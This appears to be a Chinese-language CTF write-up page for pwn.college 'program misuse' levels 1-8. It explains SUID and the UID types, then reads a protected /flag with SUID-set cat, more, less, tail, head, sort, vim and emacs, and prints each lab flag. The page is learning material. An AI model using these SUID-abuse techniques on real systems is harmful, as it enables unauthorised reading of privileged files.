@@ -1,0 +1,873 @@
+<!doctype html><html lang=zh class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="我的 CTF 之路"><meta name=author content=TephrocactusMYC><link href=https://tephrocactusmyc.github.io/CTF-CLASS/CSE466/program-misuse/ rel=canonical><link rel=icon href=../../images/favicon.ico><meta name=generator content="mkdocs-1.4.3, mkdocs-material-7.3.6"><title>program misuse - TephrocactusMYC's CTF WP</title><link rel=stylesheet href=../../assets/stylesheets/main.a57b2b03.min.css><link rel=stylesheet href=../../assets/stylesheets/palette.3f5d1f46.min.css><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback"><style>:root{--md-text-font-family:"Roboto";--md-code-font-family:"Roboto Mono"}</style><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-KJB4RXSKZG"),document.addEventListener("DOMContentLoaded",function(){"undefined"!=typeof location$&&location$.subscribe(function(t){gtag("config","G-KJB4RXSKZG",{page_path:t.pathname})})})</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-KJB4RXSKZG"></script></head> <body dir=ltr data-md-color-scheme=default data-md-color-primary=light-blue data-md-color-accent=deep-purple> <script>function __prefix(e){return new URL("../..",location).pathname+"."+e}function __get(e,t=localStorage){return JSON.parse(t.getItem(__prefix(e)))}</script> <script>var palette=__get("__palette");if(null!==palette&&"object"==typeof palette.color)for(var key in palette.color)document.body.setAttribute("data-md-color-"+key,palette.color[key])</script> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#knowledge class=md-skip> 跳转至 </a> </div> <div data-md-component=announce> </div> <header class=md-header data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <a href=../.. title="TephrocactusMYC's CTF WP" class="md-header__button md-logo" aria-label="TephrocactusMYC's CTF WP" data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> TephrocactusMYC's CTF WP </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> program misuse </span> </div> </div> </div> <form class=md-header__option data-md-component=palette> <input class=md-option data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme=default data-md-color-primary=light-blue data-md-color-accent=deep-purple aria-label="Switch to dark mode" type=radio name=__palette id=__palette_1> <label class="md-header__button md-icon" title="Switch to dark mode" for=__palette_2 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5c-.84 0-1.65.15-2.39.42L12 2M3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29L3.34 7m.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14L3.36 17M20.65 7l-1.77 3.79a7.023 7.023 0 0 0-2.38-4.15l4.15.36m-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29L20.64 17M12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44L12 22z"/></svg> </label> <input class=md-option data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme=slate data-md-color-primary=cyan data-md-color-accent=deep-purple aria-label="Switch to light mode" type=radio name=__palette id=__palette_2> <label class="md-header__button md-icon" title="Switch to light mode" for=__palette_1 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3 3.19.09m3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95 2.06.05m-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31z"/></svg> </label> </form> <div class=md-header__option> <div class=md-select> <button class="md-header__button md-icon" aria-label="Select language"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="m12.87 15.07-2.54-2.51.03-.03A17.52 17.52 0 0 0 14.07 6H17V4h-7V2H8v2H1v2h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04M18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12m-2.62 7 1.62-4.33L19.12 17h-3.24z"/></svg> </button> <div class=md-select__inner> <ul class=md-select__list> <li class=md-select__item> <a href=./ hreflang=zh class=md-select__link> 简体中文 </a> </li> <li class=md-select__item> <a href=../../en/CSE466/program-misuse/ hreflang=en class=md-select__link> English </a> </li> </ul> </div> </div> </div> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=搜索 placeholder=搜索 autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </label> <nav class=md-search__options aria-label=Search> <a href=javascript:void(0) class="md-search__icon md-icon" aria-label=Share data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08z"/></svg> </a> <button type=reset class="md-search__icon md-icon" aria-label=Clear tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> 正在初始化搜索引擎 </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/TephrocactusMYC/CTF-CLASS/ title=前往仓库 class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg> </div> <div class=md-source__repository> CTF-CLASS </div> </a> </div> </nav> </header> <div class=md-container data-md-component=container> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../.. title="TephrocactusMYC's CTF WP" class="md-nav__button md-logo" aria-label="TephrocactusMYC's CTF WP" data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg> </a> TephrocactusMYC's CTF WP </label> <div class=md-nav__source> <a href=https://github.com/TephrocactusMYC/CTF-CLASS/ title=前往仓库 class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg> </div> <div class=md-source__repository> CTF-CLASS </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../.. class=md-nav__link> ABOUT </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2 type=checkbox id=__nav_2> <label class=md-nav__link for=__nav_2> CSE365 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=CSE365 data-md-level=1> <label class=md-nav__title for=__nav_2> <span class="md-nav__icon md-icon"></span> CSE365 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../CSE365/ class=md-nav__link> ABOUT CSE365 </a> </li> <li class=md-nav__item> <a href=../../CSE365/talking-web/ class=md-nav__link> talking-web </a> </li> <li class=md-nav__item> <a href=../../CSE365/cryptography.md class=md-nav__link> cryptography </a> </li> <li class=md-nav__item> <a href=../../CSE365/websecurity/ class=md-nav__link> websecurity </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3 type=checkbox id=__nav_3 checked> <label class=md-nav__link for=__nav_3> CSE466 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=CSE466 data-md-level=1> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> CSE466 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../ class=md-nav__link> ABOUT CSE466 </a> </li> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" data-md-toggle=toc type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> program misuse <span class="md-nav__icon md-icon"></span> </label> <a href=./ class="md-nav__link md-nav__link--active"> program misuse </a> <nav class="md-nav md-nav--secondary" aria-label=目录> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 目录 </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#_1 class=md-nav__link> 基本知识 </a> <nav class=md-nav aria-label=基本知识> <ul class=md-nav__list> <li class=md-nav__item> <a href=#ref class=md-nav__link> ref </a> </li> <li class=md-nav__item> <a href=#ref_1 class=md-nav__link> ref </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../program-interaction/ class=md-nav__link> program interaction </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4 type=checkbox id=__nav_4> <label class=md-nav__link for=__nav_4> WarGame <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=WarGame data-md-level=1> <label class=md-nav__title for=__nav_4> <span class="md-nav__icon md-icon"></span> WarGame </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../WarGame/REAMD.md class=md-nav__link> ABOUT WarGame </a> </li> <li class=md-nav__item> <a href=../../WarGame/bandit/ class=md-nav__link> bandit </a> </li> <li class=md-nav__item> <a href=../../WarGame/krypton/ class=md-nav__link> krypton </a> </li> <li class=md-nav__item> <a href=../../WarGame/leviathan/ class=md-nav__link> leviathan </a> </li> <li class=md-nav__item> <a href=../../WarGame/Natas/ class=md-nav__link> natas </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_5 type=checkbox id=__nav_5> <label class=md-nav__link for=__nav_5> MalwareAnalysis <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=MalwareAnalysis data-md-level=1> <label class=md-nav__title for=__nav_5> <span class="md-nav__icon md-icon"></span> MalwareAnalysis </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../MalwareAnalysis/READMD/ class=md-nav__link> ABOUT MalwareAnalysis </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_5_2 type=checkbox id=__nav_5_2> <label class=md-nav__link for=__nav_5_2> knoweledge <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=knoweledge data-md-level=2> <label class=md-nav__title for=__nav_5_2> <span class="md-nav__icon md-icon"></span> knoweledge </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../MalwareAnalysis/knowledge/ch0/ class=md-nav__link> ch0 </a> </li> <li class=md-nav__item> <a href=../../MalwareAnalysis/knowledge/ch1/ class=md-nav__link> ch1 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_5_3 type=checkbox id=__nav_5_3> <label class=md-nav__link for=__nav_5_3> Lab <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Lab data-md-level=2> <label class=md-nav__title for=__nav_5_3> <span class="md-nav__icon md-icon"></span> Lab </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../MalwareAnalysis/Lab/lab1/ class=md-nav__link> lab1 </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label=目录> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 目录 </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#_1 class=md-nav__link> 基本知识 </a> <nav class=md-nav aria-label=基本知识> <ul class=md-nav__list> <li class=md-nav__item> <a href=#ref class=md-nav__link> ref </a> </li> <li class=md-nav__item> <a href=#ref_1 class=md-nav__link> ref </a> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <a href=https://github.com/TephrocactusMYC/CTF-CLASS/edit/master/docs/CSE466/program-misuse.md title=编辑此页 class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg> </a> <h1 id=knowledge>knowledge</h1> <h2 id=_1>基本知识</h2> <p>linux、命令行、进程、文件系统、目录、软连接和硬链接、路径（绝对、相对）、管道、重定向</p> <h5 id=ref>ref</h5> <p>关于软连接，这里有几个不错的参考 - <a href=https://xzchsia.github.io/2020/03/05/linux-hard-soft-link/ >挺清楚的讲解</a> - <a href=https://www.runoob.com/note/29134>菜鸟</a></p> <p>然后是权限、提权的内容</p> <p>这里需要明白权限、用户、用户组这些概念，以及非常非常重要的uid gid等内容</p> <pre><code>SUID: execute with the eUID of the file owner rather than the parent process.
+SGID: execute with the eGID of the file owner rather than the parent process.
+Sticky: used for shared directories to limit file removal to file owners.
+
+Three different type of user and group IDs:
+
+Effective (eUID, eGID): the UID/GID used for most access checks.
+Real (UID, GID): the &quot;real&quot; UID (or GID) of the process owner, used for things such as signal checks.
+Saved: a UID/GID that your process could switch its eUID/eGID to. Used for temporarily dropping privileges.
+</code></pre> <h5 id=ref_1>ref</h5> <ul> <li><a href=https://www.cnblogs.com/limingluzhu/p/5702486.html>一个博客</a></li> <li><a href=https://www.junmajinlong.com/linux/euid_ruid/ >这个博客的风格我很喜欢，哪天偷过来</a></li> </ul> <h1 id=challenges>challenges</h1> <h2 id=useful-shell>useful shell</h2> <pre><code>#!/bin/bash
+
+# 进入/challenge目录
+cd /challenge
+
+# 获取该目录下唯一的文件名
+filename=$(ls)
+
+# 执行该文件
+./$filename
+</code></pre> <p>then</p> <pre><code>sh filename.sh
+</code></pre> <h2 id=level1-lets-you-directly-read-the-flag>level1 Lets you directly read the flag!</h2> <pre><code>hacker@program-misuse-level-1:/challenge$ ./babysuid_level1
+Welcome to ./babysuid_level1!
+
+This challenge is part of a series of programs that
+exposes you to very simple programs that let you directly read the flag.
+
+I just set the SUID bit on /usr/bin/cat.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level1) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/cat!
+hacker@program-misuse-level-1:/challenge$
+</code></pre> <p>已经给我uid了，然后我直接读取即可</p> <pre><code>hacker@program-misuse-level-1:/$ ls
+bin  boot  challenge  dev  etc  flag  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
+hacker@program-misuse-level-1:/$ cat flag
+pwn.college{gtmGRqQdewLiKKwB2Wi1NeBxX3w.01M0EDL2QjMyMzW}
+hacker@program-misuse-level-1:/$
+</code></pre> <h2 id=level2-lets-you-directly-read-the-flag>level2 Lets you directly read the flag!</h2> <pre><code>hacker@program-misuse-level-2:/challenge$ ./babysuid_level2
+Welcome to ./babysuid_level2!
+
+This challenge is part of a series of programs that
+exposes you to very simple programs that let you directly read the flag.
+
+I just set the SUID bit on /usr/bin/more.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level2) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/more!
+hacker@program-misuse-level-2:/challenge$
+</code></pre> <p>这个是用 <code>more</code> 读取</p> <pre><code>hacker@program-misuse-level-2:/challenge$ more /flag
+pwn.college{g0orxg7_IfgidrE5G2scOM8wdRx.0FN0EDL2QjMyMzW}
+hacker@program-misuse-level-2:/challenge$
+</code></pre> <h2 id=level3-lets-you-directly-read-the-flag>level3 Lets you directly read the flag!</h2> <pre><code>hacker@program-misuse-level-3:/challenge$ ./babysuid_level3
+Welcome to ./babysuid_level3!
+
+This challenge is part of a series of programs that
+exposes you to very simple programs that let you directly read the flag.
+
+I just set the SUID bit on /usr/bin/less.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level3) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/less!
+hacker@program-misuse-level-3:/challenge$
+</code></pre> <p>这次是用<code>less</code></p> <pre><code>hacker@program-misuse-level-3:/challenge$ less /flag
+pwn.college{onJWxeGXCk8o-LqXlLemr-Xzk2W.0VN0EDL2QjMyMzW}
+/flag (END)
+
+</code></pre> <p>less比more好用，记得使用q退出</p> <h2 id=level4-lets-you-directly-read-the-flag>level4 Lets you directly read the flag!</h2> <pre><code>hacker@program-misuse-level-4:/challenge$ ./babysuid_level4
+Welcome to ./babysuid_level4!
+
+This challenge is part of a series of programs that
+exposes you to very simple programs that let you directly read the flag.
+
+I just set the SUID bit on /usr/bin/tail.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level4) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/tail!
+hacker@program-misuse-level-4:/challenge$
+</code></pre> <p>用<code>tail</code></p> <pre><code>hacker@program-misuse-level-4:/challenge$ tail /flag
+pwn.college{8A8n6zzy-sUTn179ZADopx1lzFV.0lN0EDL2QjMyMzW}
+hacker@program-misuse-level-4:/challenge$
+</code></pre> <p>我现在猜下一个用head</p> <h2 id=level5-lets-you-directly-read-the-flag>level5 Lets you directly read the flag!</h2> <pre><code>hacker@program-misuse-level-5:~$ sh file.sh
+Welcome to ./babysuid_level5!
+
+This challenge is part of a series of programs that
+exposes you to very simple programs that let you directly read the flag.
+
+I just set the SUID bit on /usr/bin/head.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level5) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/head!
+hacker@program-misuse-level-5:~$
+</code></pre> <p>果然用head</p> <pre><code>hacker@program-misuse-level-5:~$ head /flag
+pwn.college{wVl3wFV0tMkY6rAFaMWKvEoOt2R.01N0EDL2QjMyMzW}
+hacker@program-misuse-level-5:~$
+</code></pre> <h2 id=level6-lets-you-directly-read-the-flag>level6 Lets you directly read the flag!</h2> <pre><code>hacker@program-misuse-level-6:~$ sh file.sh
+Welcome to ./babysuid_level6!
+
+This challenge is part of a series of programs that
+exposes you to very simple programs that let you directly read the flag.
+
+I just set the SUID bit on /usr/bin/sort.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level6) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/sort!
+hacker@program-misuse-level-6:~$ sort /flag
+pwn.college{wRB7HgX_kvB4Uro33D7t1UKWZcE.0FO0EDL2QjMyMzW}
+hacker@program-misuse-level-6:~$
+</code></pre> <p>这次居然是用sort</p> <p><strong>这里做一个小总结，以上这几个工具都非常常用，而且经常是组合使用的，建议使用<code>man</code>阅读手册，然后多尝试搭配使用。</strong></p> <h2 id=level7-shows-you-that-an-over-privileged-editor-is-a-very-powerful-tool>level7 Shows you that an over-privileged editor is a very powerful tool!</h2> <pre><code>hacker@program-misuse-level-7:~$ sh file.sh
+Welcome to ./babysuid_level7!
+
+This challenge is part of a series of programs that
+shows you that an over-privileged editor is a very powerful tool, indeed.
+
+I just set the SUID bit on /usr/bin/vim.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level7) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/vim!
+hacker@program-misuse-level-7:~$ vim /flag
+</code></pre> <p>从标题能看出来是用某种编辑工具，这次是<code>vim</code></p> <pre><code>pwn.college{YA-02bwpz2aH0bVuFckXnVUE_a8.0VO0EDL2QjMyMzW}
+</code></pre> <p>我猜后边儿得有nano emacs等等</p> <h2 id=level8-shows-you-that-an-over-privileged-editor-is-a-very-powerful-tool>level8 Shows you that an over-privileged editor is a very powerful tool!</h2> <pre><code>hacker@program-misuse-level-8:~$ sh file.sh
+Welcome to ./babysuid_level8!
+
+This challenge is part of a series of programs that
+shows you that an over-privileged editor is a very powerful tool, indeed.
+
+I just set the SUID bit on /usr/bin/emacs.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level8) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/emacs!
+</code></pre> <p>果然不出我所料hhh</p> <pre><code>pwn.college{sCKRHf2_yRVb3Q_MEPjyLzcoqdN.0FM1EDL2QjMyMzW}
